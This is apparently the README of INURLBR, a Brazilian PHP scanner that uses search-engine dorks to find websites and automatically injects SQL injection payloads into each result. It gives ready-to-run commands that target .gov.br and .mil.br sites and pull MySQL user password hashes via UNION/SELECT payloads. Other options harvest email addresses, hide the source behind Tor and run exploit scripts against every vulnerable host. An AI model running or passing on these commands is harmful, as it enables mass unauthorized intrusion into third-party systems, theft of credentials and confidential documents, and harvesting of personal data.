SCANNER - INURLBR
===============

>Busca avançada em motores de busca, Possibilita desde analise com exploit GET/POST a captura de emails &amp; validação personalizada interna para cada alvo/url encontrada.

>
 * GRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
 * SCRIPT NAME: INURLBR
 * AUTOR:    Cleiton Pinheiro
 * Nick:     Googleinurl
 * Blog:     http://blog.inurl.com.br
 * twitter: /@googleinurl
 * facebook: /InurlBrasil
 * Versão:  1.0.1
 * php5-curl           LIB
 * php5-cli            LIB  
 * cURL support        enabled
 * cURL Information    7.24.0
 * allow_url_fopen     On
 * permission          Reading & Writing
 * User                root privilege, or is in the sudoers group
 * Operating system    LINUX
 * Proxy random        TOR    
 * ----------------------------------------------------------
 * [+] PERMISSION EXECUTION: chmod +x inurlbr.php
 * [+] INSTALLING LIB CURL: sudo apt-get install php5-curl
 * [+] INSTALLING LIB CLI: sudo apt-get install php5-cli
 * [+] INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en
 * ----------------------------------------------------------

 * [+] COMMANDS SIMPLE
 * ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?'0x27"  

 * ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"

 * ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"

 * ./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'

 * ./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'

 * ./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'

 * ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"

 * ./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get "+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;" -a '::EXPLOIT-SUCESS::'


 * Opções disponíveis: 

- Ajuda/Help:
------
```
./inurlbr.php --ajuda
./inurlbr.php --help
./inurlbr.php -h
```
- Opções:
------
```
 _    _ ______ _      _____  
| |  | |  ____| |    |  __ \
| |__| | |__  | |    | |__) |
|  __  |  __| | |    |  ___/
| |  | | |____| |____| |    
|_|  |_|______|______|_|                      
----------------------------------------------------------------------------------------------------------------------------------
-h
--help   Alternative long length help command.
--ajuda  Command to specify Help.
--info   Information script.
 -q  Choose which search engine you want through [1...13]:
     [options]:
     1   - www.google.com.br
     2   - www.bing.com
     3   - br.search.yahoo.com
     4   - www.ask.com
     5   - search.hao123.com.br
     6   - ajax.googleapis.com
     7   - search.lycos.com
     8   - busca.uol.com.br
     9   - us.yhs4.search.yahoo.com
     10  - pesquisa.sapo.pt
     11  - www.dmoz.org
     12  - www.gigablast.com
     13  - web.search.naver.com
     all - All search engines
     Default:    1
     Example: -q {op}
     Usage:   -q 1
              -q 5
               Using more than one engine:  -q 1,2,5,6,11
               Using all engines:      -q all
     
 -p  Choose which proxy you want to use through the search engine:
     Example: -p {proxy:port}
     Usage:   -p localhost:8118
              -p socks5://googleinurl@localhost:9050
              -p http://admin:12334@172.16.0.90:8080
   
--tor-random Enables the TOR function, each usage links an unique IP.
 
 -t  Choose the validation type: op 1, 2, 3
     [options]:
     1   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
   
     2   -  The second type tries to valid the error defined by: -a='ALGO_DENTRO_ALVO'
     It also establishes connection with the exploit through the get method
     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
   
     3   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br{exploit}
     Default:    1
     Example: -t {op}
     Usage:   -t 1
     
     DEFAULT ERRORS:  
     CMS WORDPRESS, JDBC ERROR, MYSQL ERROR, MICROSOFT ERROR, ORACLE ERROR, POSTGRESQL ERROR,
     ZEND FRAMEWORK ERROR, PHP ERROR, ASP ERROR, LUA ERROR, INDEFINITE ERROR
   
 --dork Defines which dork the search engine will use.
     Example: --dork {dork}
     Usage:   --dork 'site:.gov.br inurl:php? id'
     - Using multiples dorks:
     Example: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
     Usage:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
 
 --exploit-get Defines which exploit will be injected through the GET method to each URL found.
     Example: --exploit-get {exploit_get}
     Usage:   --exploit-get '?´0x27;'
     
 --exploit-post Defines which exploit will be injected through the POST method to each URL found.
     Example: --exploit-post {exploit_post}
     Usage:   --exploit-post 'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'
     
 --exploit-comand Defines which exploit/parameter will be executed in the options: --comand-vul/--comand-all.  
     The exploit-comand will be identified by the paramaters: --comand-vul/--comand-all como _EXPLOIT_        
     Ex --exploit-comand '/admin/config.conf' --comand-all 'curl -v _TARGET__EXPLOIT_'
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option --exploit-comand.
     Example: --exploit-comand {exploit-comand}
     Usage:   --exploit-comand '/admin/config.conf'    
     
 -a  Specify the string that will be used on the search script:
     Example: -a {string}
     Usage:   -a '<title>hello world</title>'
     
 -d  Specify the script usage op 1, 2, 3, 4, 5, 6.
     Example: -d {op}
     Usage:     -d 1 /URL of the search engine.
              -d 2 /Show all the url.
              -d 3 /Detailed request of every URL.
              -d 4 /Shows the HTML of every URL.
              -d 5 /Detailed request of all URLs.
             
 -s  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: -s {file}
     Usage:   -s your_file.txt
     
 -o  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: -o {file_where_my_urls_are}
     Usage:   -o tests.txt
 
 -m  Enable the search for emails on the urls specified.
       
 -u  Enables the search for URL lists on the url specified.
 
 --gc Enable validation of values ​​with google webcache.
 
 --cms-check Enable simple check if the url / target is using CMS


 --comand-vul Every vulnerable URL found will execute this command parameters.
     Example: --comand-vul {command}
     Usage:   --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
              --comand-vul './exploit.sh _TARGET_ output.txt'
             
 --comand-all Use this commmand to specify a single command to EVERY URL found.
     Example: --comand-all {command}
     Usage:   --comand-all 'nmap sV -p 22,80,21 _TARGET_'
              --comand-all './exploit.sh _TARGET_ output.txt'
             
    Observation:
   
    _TARGET_ will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
   _TARGETFULL_ will be replaced by the original URL / target found.
   
   _EXPLOIT_  will be replaced by the specified command argument --exploit-comand.
   The exploit-comand will be identified by the parameters --comand-vul / --comand-all as _EXPLOIT_

 --replace Replace values ​​in the target URL.
    Example:  --replace {value_old[INURL]value_new}
     Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
```

- Dando permissão para execução do script:
------
```
$chmod +x inurlbr.php
Executar: ./inurlbr.php
```

- Efetuando pesquisa simples:
------
  * Comando --dork {sua_dork}
  * Comando -s    {resultados.txt}
  * Comando --exploit-get {exploit}
  * Comando -q {motor_de_busca}
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all
```
- Efetuando pesquisa com múltiplas dorks:
------
  * Comando/simples   --dork {sua_dork}
  * Comando/múltiplas --dork {[DORK]sua_dork1[DORK]sua_dork2[DORK]sua_dork3}
```
./inurlbr.php --dork "[dork]site:br noticias php?id=[dork]site:ar noticias php?id=[dork]site:gov.br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all
```
- Efetuando pesquisa com um ou mais motores de busca:
------
  * Comando -q {motor_de_busca}
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q {OPÇÃO}
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q 5
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q 1,2,3,4
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q 12,11,7,1

```
- Definindo tipo de erro a ser validado:
------
  * Comando -t {op}
  * TIPO[1] Valida erros padrões do script injeta & concatena exploit apartir do host & gets.
```
demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
demonstrativo: www.alvo.com.br/pasta/pasta2/list.php?menu=1&id={exploit}
```
   Procura dentro da url valores/erros padrões definidos internamente no script.
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all -t 1
```
  * TIPO[2] Valida o erro definido na opção -a='ALGO_DENTRO_ALVO' injeta & concatena exploit apartir do host & gets.
```
demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
```   
   Procura dentro da url valores/erros padrões definidos na opção -a 'ALGO_DENTRO_ALVO'           
   Ex: Quero encontrar a palavra "marighella" dentro das urls encontradas -a 'marighella'.
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all -t 2 -a 'marighella'
```
  * TIPO[3] Valida erro definido na opção -a='ALGO_DENTRO_ALVO' & erros padrão script.
    injeta & concatena exploit apartir do host.
```
demonstrativo: www.alvo.com.br{exploit}
```
  >Procura dentro da url valores/erros padrões + valor opção -a 'ALGO_DENTRO_ALVO'           
   Ex: Quero encontrar a palavra "marighella" dentro das urls encontradas -a 'marighella'.
   Caso eu tenho um exploit que ao ser executado na url seja gerado um  erro/valor, assim o script procura pelo
   valor 'marighella' caso seja encontrado url/alvo é considerada possível vulnerável.
```  
Ex: Exploit = '/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users
```     
   >Valor:0x3A3A3A494E55524C3A3A3A é a string '::::INURL::' convertida em hexadecimal.
   URL/ALVO encontrada pelo script:
```    
www.alvo.com.br/valores/casas.php?abrir=1
```    
   O script vai filtrar a url retornando somente o host + exploit, assim executando.
```   
www.alvo.com.br/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users
```   
   >Como vamos saber se foi explorado com sucesso ?
   Definindo o valor -a '::::INURL::', caso esse valor apareça na url executada é passível de vulnerabilidade.
Ex:   
```   
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt 
--exploit-get "/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users" 
-q all -t 3 -a '::::INURL::'
```    
   
Caso queira procurar por sites que usam CMS 'Joomla! 1.5':
Ex:   
```   
./inurlbr.php --dork 'site:br "How do I install Joomla! 1.5?"' -s resultados.txt  -q all -t 3 -a 'Joomla! 1.5'
``` 
- Definindo exploit GET/POST.
-----
  * Comando --exploit-get {exploit}
  * --exploit-get  Define exploit via get será injetado a cada URL encontrada.
```
Exemplo: --exploit-get {exploit_get}
Uso:     --exploit-get '?´0x27;'
         demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit-get}
         demonstrativo: www.alvo.com.br/pasta/pasta2/list.php?menu=1&id={exploit-get}
```
  * Comando --exploit-post {exploit}
  * --exploit-post Define exploit via post será injetado a cada URL encontrada.

```
Exemplo: --exploit-post {exploit_post}
Uso:     --exploit-post 'campo1=valor1&campo2=valor2&campo3=?´0x273exploit;&botao=ok'
         demonstrativo: www.alvo.com.br/pasta/index.php VIA POST {exploit-post}
         demonstrativo: www.alvo.com.br/pasta/pasta2/list.php VIA POST {exploit-post}
```
- Definindo valor personalizado que deve ser procurado dentro de cada URL/ALVO:
-----
  * Comando -a {valor_procurado}
  * -a  Define string que será procurada dentro de cada URL encontrada.
```
Exemplo: -a {string_procurada}
Uso:     -a '<title>Ola dorkeiro</title>'
         demonstrativo: -a 'Joomla! 1.5'
         demonstrativo: -a 'Prefeitura - '
         demonstrativo: -a 'maria'
         demonstrativo: -a '23423423423523'
```
- Definindo arquivo que vai ser nossa base de URL's, sem a necesidade de busca com motores:
-----
  * Comando -a {arquivo_urls.txt}
  * -o  Define arquivo que vai possibilitar execucação de testes com base em arquivo.
```  
Sem motor de busca.
Exemplo: -o {arquivo_minhas_urls}
Uso:     -o testes.txt
demonstrativo arquivo formatado:
         www.alvo1.com.br/pasta2/pasta2/list2.php?menu=1&id=423423
         www.alvo2.com.br/pasta/list.php?menu3=1&id=23
         www.alvo3.com.br/pasta2/list.php?menu=1&id=2345
         www.alvo4.com.br/pasta/pasta2/list2.php?menu=1&id=3
         www.alvo7.com.br/pasta/pasta2/list.php?menu=1&id=2
         www.alvo0.com.br/arquivo/pasta2/index.php?menu_id=1&id=1
```    
   >Essas urls serão caregadas no scripts para testes de acordo com os parâmetros passados.
   
 - Definindo busca de emails:
-----
  * Comando -m
  * -m  Habilita buscar lista de emais dentro das urls encontrdas.
``` 
/inurlbr.php --dork '@gmail @mail ext:txt' -s resultados.txt  -q all -m
``` 
 - Definindo proxy/tor:
-----
  * Comando -p {proxy}
  * -p  Define proxy para camuflagem envio de request para o motor de busca e para alvo-exploit.
```   
Exemplo: -p {proxy}
Uso:     -p localhost:8118
         -p socks5://googleinurl@localhost:9050
         -p http://admin:12334@172.16.0.90:8080
``` 
 - Definindo proxy-random:
-----
  * Comando --tor-random
  * --tor-random habilita a função tor randômico, a cada execução do script o tor muda de ip.

>
Esse comando só é executado caso tenha preenchido a opção -p {proxy}.
Para que tal função tenha funcionamento deve-se instalar o aplivativo tor.
A cada execução nova do script seu ip na rede TOR será renovado.
Ajuda:                                                                                    
- https://www.torproject.org/docs/debian.html.en
- http://www.privoxy.org/

 - Definindo comando externo:
-----
  * Comando --comand-vul {comando_terminal}
  * --comand-vul Executa comandos no terminal para cada URL encontrada vulnerável.
```  
    Exemplo: --comand-vul {comando}
    Uso:     --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
             --comand-vul './exploit.sh _TARGET_ output.txt'
             --comand-vul 'pint -c 1 _TARGET_ >> output.txt'
```
  * Comando --comand-all {comando_terminal}
  * --comand-all Executa comandos no terminal para todas URLS encontradas.
```    
    Exemplo: --comand-all {comando}
    Uso:     --comand-all 'nmap sV -p 22,80,21 _TARGET_'
             --comand-all './exploit.sh _TARGET_ output.txt'
             --comand-vul 'pint -c 1 _TARGET_ >> output.txt'
```               
